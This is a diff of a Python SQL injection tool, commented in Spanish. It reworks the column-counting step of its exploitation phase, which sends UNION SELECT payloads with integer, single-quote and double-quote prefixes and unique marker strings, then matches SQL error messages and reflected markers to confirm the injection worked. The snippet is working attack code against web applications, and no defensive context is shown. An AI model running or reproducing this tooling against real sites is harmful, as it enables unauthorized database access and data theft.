@@ -67,30 +67,30 @@ def check_for_sqli(target_url, param, extra_params=None):
 def obtener_num_columnas(url, param_vulnerable, otros_params):
     """
     Fase 1 Explotación: Determinar número de columnas usando UNION SELECT.
-    Prueba diferentes tipos de inyección: entero, comilla simple y comilla doble.
+    Prueba diferentes tipos de inyección: comilla simple, comilla doble y entero.
     """
     print("[*] Calculando número de columnas...")
     
     # Diferentes prefijos según el tipo de inyección
     prefijos = [
-        ("entero", "1 UNION SELECT "),
         ("comilla simple", "1' UNION SELECT "),
-        ("comilla doble", '1" UNION SELECT ')
+        ("comilla doble", '1" UNION SELECT '),
+        ("entero", "1 UNION SELECT ")
     ]
     
     for tipo, prefijo in prefijos:
         print(f"  [*] Probando tipo: {tipo}")
         for i in range(1, 50):
-            # Generar un payload con i columnas
-            nulls = ",".join(["NULL"] * i)
-            payload = f"{prefijo}{nulls} -- -"
+            # Generar un payload con i columnas usando marcadores únicos
+            marcadores = [f"'col{j}mark'" for j in range(1, i + 1)]
+            payload = f"{prefijo}{','.join(marcadores)} -- -"
             
             params_actuales = otros_params.copy()
             params_actuales[param_vulnerable] = payload
             
             html = realizar_peticion(url, params_actuales)
             
-            # Si no hay error de SQL, el número de columnas es correcto
+            # Verificar si hay error SQL
             errores_sql = [
                 "you have an error in your sql syntax",
                 "warning: mysql",
@@ -101,12 +101,18 @@ def obtener_num_columnas(url, param_vulnerable, otros_params):
                 "mysql_num_rows",
                 "pg_query",
                 "syntax error",
-                "mysql",
                 "unclosed quotation",
                 "unknown column",
-                "the used select statements have a different number of columns"
+                "different number of columns",
+                "operand should contain"
             ]
-            if not any(error.lower() in html.lower() for error in errores_sql):
+            
+            tiene_error = any(error.lower() in html.lower() for error in errores_sql)
+            
+            # Verificar si los marcadores aparecen en la respuesta (inyección exitosa)
+            marcador_encontrado = any(f"col{j}mark" in html for j in range(1, i + 1))
+            
+            if not tiene_error and marcador_encontrado:
                 print(f"[+] Número de columnas encontrado: {i} (tipo: {tipo})")
                 return i, tipo
     
